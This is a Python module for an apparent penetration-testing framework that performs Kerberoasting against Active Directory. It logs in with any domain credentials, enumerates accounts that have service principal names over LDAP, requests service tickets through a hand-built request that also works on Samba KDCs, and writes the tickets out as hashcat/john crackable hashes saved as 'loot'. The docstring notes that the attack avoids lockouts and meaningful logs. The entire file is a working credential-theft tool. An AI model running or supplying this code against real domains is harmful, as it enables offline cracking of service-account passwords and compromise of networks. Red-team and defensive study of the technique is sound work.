"""Kerberoast: request service tickets for SPN accounts, output crackable hashes.

Why this works (and why it's an AD classic): any authenticated domain user
can ask the KDC for a service ticket (TGS) for any SPN. The ticket's
encrypted part is sealed with the SERVICE ACCOUNT's password-derived key —
take it offline, crack it at leisure, no lockouts, no logs that mean
anything to most defenders. Service accounts with weak passwords are the
usual casualties.

The natural next step after ad_enum flags kerberoastable accounts: run
this with any valid domain creds, feed the hashes to hashcat/john.

COMPAT NOTE: impacket's getKerberosTGS builds the AP-REQ authenticator
WITHOUT the RFC-optional cksum field. Windows KDCs accept that; Samba's
Heimdal KDC rejects it ("No authenticator in request" /
KRB_AP_ERR_INAPP_CKSUM, kdc/krb5tgs.c). So this module vendors its own
request that includes the checksum (HMAC over the req-body, usage 6).
"""

import datetime
import random

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (
        AP_REQ,
        AS_REP,
        TGS_REP,
        TGS_REQ,
        Authenticator,
        seq_set,
        seq_set_iter,
    )
    from impacket.krb5.crypto import Cksumtype, make_checksum
    from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
    from impacket.krb5.types import KerberosTime, Principal, Ticket
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
except ImportError:
    constants = Principal = impacket_ldap = ldapasn1 = None
    getKerberosTGT = sendReceive = decoder = encoder = noValue = None
    AP_REQ = AS_REP = TGS_REP = TGS_REQ = KerberosTime = None
    seq_set = seq_set_iter = make_checksum = Cksumtype = None
    Authenticator = Ticket = None
RC4 = 23   # constants.EncryptionTypes.rc4_hmac
AES256 = 18  # constants.EncryptionTypes.aes256_cts_hmac_sha1_96

# authenticator checksum type per session enctype (what Heimdal expects)
def _auth_cksum_type(enctype):
    return {23: Cksumtype.HMAC_MD5, 17: Cksumtype.SHA1_AES128,
            18: Cksumtype.SHA1_AES256}[enctype]


def _strip_explicit_tag(data):
    """Remove a leading [n] EXPLICIT tag wrapper from a DER value."""
    if not data or not 0xA0 <= data[0] <= 0xBF:
        return data
    if data[1] & 0x80:
        return data[2 + (data[1] & 0x7F):]
    return data[2:]


def request_tgs(spn, domain, kdc_host, tgt, cipher, session_key):
    """getKerberosTGS, but the authenticator carries the cksum field that
    Heimdal KDCs (Samba AD) require. Returns the raw TGS-REP bytes."""
    decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    domain = domain.upper()
    ticket = Ticket()
    ticket.from_asn1(decoded_tgt["ticket"])

    # req-body first: the authenticator checksum covers its encoding
    tgs_req = TGS_REQ()
    tgs_req["pvno"] = 5
    tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    req_body = seq_set(tgs_req, "req-body")
    req_body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.canonicalize.value,
        # NOTE: do not set "renew"/"renewable-ok" like impacket does —
        # Heimdal reads "renew" literally, computes renew_till = rtime ≈
        # now, and fails with KDC_ERR_NEVER_VALID. Windows just clamps.
    ])
    seq_set(req_body, "sname", spn.components_to_asn1)
    req_body["realm"] = domain
    now = datetime.datetime.now(datetime.timezone.utc)
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["rtime"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = random.getrandbits(31)
    seq_set_iter(req_body, "etype", (
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
    ))
    req_body_bytes = encoder.encode(req_body)
    # pyasn1 encodes the [4]-explicit wrapper into req_body_bytes; Heimdal
    # checksums the bare KDC-REQ-BODY SEQUENCE TLV (its decoded _save), so
    # strip the explicit wrapper before checksumming.
    req_body_bytes = _strip_explicit_tag(req_body_bytes)

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = decoded_tgt["crealm"].asOctets()
    client_name = Principal()
    client_name.from_asn1(decoded_tgt, "crealm", "cname")
    seq_set(authenticator, "cname", client_name.components_to_asn1)
    # the field impacket omits and Heimdal requires:
    def _fill_cksum(component):
        component["cksumtype"] = _auth_cksum_type(cipher.enctype)
        component["checksum"] = make_checksum(component["cksumtype"],
                                              session_key, 6, req_body_bytes)
        return component

    seq_set(authenticator, "cksum", _fill_cksum)
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)
    encoded_auth = encoder.encode(authenticator)

    ap_req = AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    ap_req["ap-options"] = constants.encodeFlags([])
    seq_set(ap_req, "ticket", ticket.to_asn1)
    ap_req["authenticator"] = noValue
    ap_req["authenticator"]["etype"] = cipher.enctype
    ap_req["authenticator"]["cipher"] = cipher.encrypt(session_key, 7,
                                                     encoded_auth, None)
    tgs_req["padata"] = noValue
    tgs_req["padata"][0] = noValue
    tgs_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)
    return sendReceive(encoder.encode(tgs_req), domain, kdc_host)


def tgs_to_hash(user, domain, spn, enc_part, etype):
    """Format a TGS ticket's encrypted part as a hashcat/john hash."""
    raw = bytes(enc_part)
    if etype == RC4:
        return f"$krb5tgs$23$*{user}${domain}${spn}*${raw[:16].hex()}${raw[16:].hex()}"
    if etype == AES256:
        return f"$krb5tgs$18${user}${domain}${spn}${raw[-12:].hex()}${raw[:-12].hex()}"
    raise ValueError(f"unsupported etype: {etype}")


class Kerberoast(AuxiliaryModule):
    name = "Kerberoast (TGS extraction)"
    description = """
        Requests service tickets for SPN accounts and writes them as
        hashcat/john-crackable hashes (loot type 'hash'). Works with any
        valid domain credential — that's the point of the attack. Roast
        specific USERS, or enumerate SPN accounts over LDAP when it's blank.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Any valid domain user"))
        self.options.add(OptString("PASSWORD", required=True, description="Password"))
        self.options.add(OptString("USERS", default="",
                                   description="Accounts to roast, comma-separated "
                                               "(blank = enumerate SPN users via LDAP)"))

    def _tgt(self, host, domain, user, password):
        principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        return getKerberosTGT(principal, password, domain, "", "", kdcHost=host)

    def _spn_users(self, host, domain, user, password):
        """[(account, [spns])] from the directory, roastable-only."""
        base = ",".join(f"DC={p}" for p in domain.split("."))
        conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
        conn.login(user, password, domain)
        out = []
        for packet in conn.search(
            searchBase=base, searchFilter="(servicePrincipalName=*)",
            attributes=["sAMAccountName", "servicePrincipalName", "objectClass"],
        ):
            if isinstance(packet, ldapasn1.SearchResultEntry):
                attrs = {str(a["type"]): [str(v) for v in a["vals"]]
                         for a in packet["attributes"]}
                name = attrs.get("sAMAccountName", [""])[0]
                classes = attrs.get("objectClass", [])
                if name.lower() != "krbtgt" and "computer" not in classes:
                    out.append((name, attrs.get("servicePrincipalName", [])))
        return out

    def run(self):
        domain = str(self.get_option("DOMAIN"))
        user = str(self.get_option("USERNAME"))
        password = str(self.get_option("PASSWORD"))
        only = {u.strip().lower() for u in str(self.get_option("USERS") or "").split(",")
                if u.strip()}

        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._roast(host, domain, user, password, only)

    def _roast(self, host, domain, user, password, only):
        store = getattr(self.framework, "store", None)
        try:
            tgt, cipher, _, session_key = self._tgt(host, domain, user, password)
        except Exception as e:
            self.print_error(f"{host}: TGT failed for {user} - {e}")
            return
        self.print_status(f"{host}: TGT acquired as {user}")
        if store is not None:
            store.add_cred(host, "kerberos", user, password, source="kerberoast")

        try:
            spn_users = self._spn_users(host, domain, user, password)
        except Exception as e:
            self.print_error(f"{host}: SPN enumeration failed - {e}")
            return
        if only:
            spn_users = [(n, s) for n, s in spn_users if n.lower() in only]
        self.print_status(f"{host}: {len(spn_users)} roastable account(s)")
        for account, spns in spn_users:
            for spn_text in spns:
                self._roast_spn(host, domain, account, spn_text,
                                tgt, cipher, session_key, store)

    def _roast_spn(self, host, domain, account, spn_text,
                   tgt, cipher, session_key, store):
        spn = Principal(spn_text, type=constants.PrincipalNameType.NT_SRV_INST.value)
        try:
            tgs = request_tgs(spn, domain, host, tgt, cipher, session_key)
        except Exception as e:
            self.print_error(f"{account}: TGS request failed - {e}")
            return
        tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        enc = tgs_rep["ticket"]["enc-part"]
        etype = int(enc["etype"])
        try:
            ticket_hash = tgs_to_hash(account, domain, spn_text, enc["cipher"], etype)
        except ValueError as e:
            self.print_error(f"{account}: {e}")
            return
        self.print_good(f"{account}: {ticket_hash[:60]}...")
        self.print_debug(f"{account}: full hash: {ticket_hash}")
        if store is not None:
            loot_id = store.add_loot("hash", f"krb5tgs {account} @ {host}",
                                     ticket_hash, address=host)
            self.print_status(f"Hash saved as loot {loot_id}")
